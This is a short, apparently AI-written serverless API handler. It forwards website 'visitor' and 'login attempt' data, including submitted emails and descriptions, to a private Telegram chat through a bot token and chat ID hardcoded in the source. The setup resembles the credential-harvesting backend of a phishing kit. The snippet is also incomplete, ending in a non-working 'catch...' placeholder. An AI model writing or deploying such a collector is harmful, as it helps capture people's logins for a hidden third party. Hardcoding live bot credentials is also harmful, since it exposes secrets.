export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { email, description, type } = req.body;

    // HARDCODED credentials (User explicitly requested this)
    const TELEGRAM_BOT_TOKEN = "8786682796:AAFKWkeCO_sBxXlnrn7dWwXgRz8G2zX3fs0";
    const TELEGRAM_CHAT_ID = "5995903013";

    // Build message logic (same as before)
    let message = '';
    if (type === 'visit') {
        message = `🔔 New Visitor!\nAgent: ${description || 'Unknown'}`;
    } else if (type === 'login') {
        message = `🔐 New Login Attempt!\nEmail: ${email}\nDescription: ${description}`;
    } else {
        message = `📩 Notification\nEmail: ${email}\nDesc: ${description}`;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
            }),
        });
        // ... rest of try/catch
    } catch...
}
